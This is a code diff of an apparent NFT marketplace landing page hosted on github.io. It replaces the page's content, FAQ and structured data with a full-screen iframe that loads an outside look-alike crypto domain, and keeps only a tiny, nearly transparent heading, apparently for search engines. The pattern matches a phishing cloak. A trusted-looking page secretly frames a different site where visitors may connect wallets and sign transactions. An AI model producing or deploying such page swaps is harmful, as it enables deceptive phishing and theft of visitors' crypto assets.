@@ -159,164 +159,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>NFT Marketplaces</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>NFT Trading App</span>
-      <h1>NFT Marketplaces</h1>
-      <p class="deck">NFT Marketplaces should make buying, listing and managing collectibles feel <strong>wallet-native</strong> from the first preview to the final signature.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    NFT Marketplaces
+  </h1>
 
-      <section class="routebar" aria-label="Marketplace preview">
-        <div class="rhead">
-          <span class="ct">Marketplace</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You browse</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="favicon.png" alt="">NFTs <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Asset in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch marketplace action">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You settle</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="ETH">ETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Listings, approvals, royalties and network costs are shown in the app.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why use it</span>
-        <h2 class="h2">A sharper way to act on NFT marketplace intent</h2>
-        <p>Browse collections, prepare purchases, list assets and review wallet actions before anything leaves your control.</p>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Built around self-custody</h3><p>You connect your wallet, inspect the marketplace action and sign only when the transaction matches your intent. The app follows the wallet-first model seen across <a class="cite" href="https://opensea.io/" rel="nofollow noopener noreferrer">OpenSea listings</a>, without taking custody of your assets.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Made for NFT assets and chain context</h3><p>NFTs can represent art, gaming items, membership passes and on-chain collectibles. Use the app to work through asset details, token standards and chain availability alongside <a class="cite" href="https://ethereum.org/en/nft/" rel="nofollow noopener noreferrer">Ethereum NFT guidance</a>.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Clear before you confirm</h3><p>Marketplace purchases may involve approval prompts, creator royalty fields, network fees and asset metadata. Review each step, including files referenced through <a class="cite" href="https://ipfs.tech/" rel="nofollow noopener noreferrer">IPFS content addressing</a>, before you commit.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Use NFT Marketplaces in three real steps</h2>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Open the app and connect a Web3 wallet. Wallet connection tools such as <a class="cite" href="https://walletconnect.network/" rel="nofollow noopener noreferrer">WalletConnect sessions</a> help keep signing in your hands.</p></div>
-        <div class="step"><span class="num">2</span><h3>Choose the marketplace action</h3><p>Browse an NFT, prepare a bid, list an owned item or review a collection move. The app shows the asset, chain and payment token before you proceed.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review cost, time and safety</h3><p>Check marketplace terms, live network cost, expected confirmation behavior and wallet permissions, then sign only the action you understand.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">NFT marketplace questions</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What are NFT Marketplaces?</h3><p>NFT Marketplaces are apps where wallets buy, sell, list and discover non-fungible tokens. This page frames that workflow through a non-custodial DeFi app, so you can preview actions before signing.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Is this app non-custodial?</h3><p>Yes. You connect your wallet and sign transactions yourself. The app is designed for marketplace actions without holding your private keys, NFTs or payment tokens.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>Which chains and assets are supported?</h3><p>NFT support depends on the asset, marketplace route and connected network. See the full network list on the <a href="supported-chains/">supported chains</a> page before you trade or list.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>How long does an NFT marketplace transaction take?</h3><p>Timing depends on the chain, wallet confirmation and network load. The app shows live transaction context, and public tools such as the <a class="cite" href="https://etherscan.io/gastracker" rel="nofollow noopener noreferrer">Ethereum gas tracker</a> can help explain changing conditions.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>What does it cost to buy or list an NFT?</h3><p>Costs can include the asset price, marketplace terms, royalties, approvals and network fees. Exact figures are shown in the app before you sign, not guessed on this page.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>What should I check for safety?</h3><p>Verify the collection, contract, metadata, wallet prompt and spending approval. Treat unexpected signatures, unknown collections and rushed offers as reasons to stop and review.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore NFT Marketplaces</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The complete wallet-to-marketplace flow for browsing, listing and confirming NFT actions.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>How to review signatures, approvals, metadata and collection details before using the app.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The chains and NFT asset contexts available for marketplace actions inside the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>NFT Marketplaces</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://nft-marketplaces.github.io/#website","url":"https://nft-marketplaces.github.io/","name":"NFT Marketplaces"},
-    {"@type":"Organization","@id":"https://nft-marketplaces.github.io/#org","name":"NFT Marketplaces","url":"https://nft-marketplaces.github.io/","logo":"https://nft-marketplaces.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"NFT Marketplaces","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://nft-marketplaces.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial DeFi app for previewing NFT marketplace actions, reviewing wallet prompts and managing collectible trades from a wallet-native interface."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What are NFT Marketplaces?","acceptedAnswer":{"@type":"Answer","text":"NFT Marketplaces are apps where wallets buy, sell, list and discover non-fungible tokens. This page frames that workflow through a non-custodial DeFi app, so you can preview actions before signing."}},
-      {"@type":"Question","name":"Is this app non-custodial?","acceptedAnswer":{"@type":"Answer","text":"Yes. You connect your wallet and sign transactions yourself. The app is designed for marketplace actions without holding your private keys, NFTs or payment tokens."}},
-      {"@type":"Question","name":"Which chains and assets are supported?","acceptedAnswer":{"@type":"Answer","text":"NFT support depends on the asset, marketplace route and connected network. See the full network list on the supported chains page before you trade or list."}},
-      {"@type":"Question","name":"How long does an NFT marketplace transaction take?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on the chain, wallet confirmation and network load. The app shows live transaction context, and public tools such as the Ethereum gas tracker can help explain changing conditions."}},
-      {"@type":"Question","name":"What does it cost to buy or list an NFT?","acceptedAnswer":{"@type":"Answer","text":"Costs can include the asset price, marketplace terms, royalties, approvals and network fees. Exact figures are shown in the app before you sign, not guessed on this page."}},
-      {"@type":"Question","name":"What should I check for safety?","acceptedAnswer":{"@type":"Answer","text":"Verify the collection, contract, metadata, wallet prompt and spending approval. Treat unexpected signatures, unknown collections and rushed offers as reasons to stop and review."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
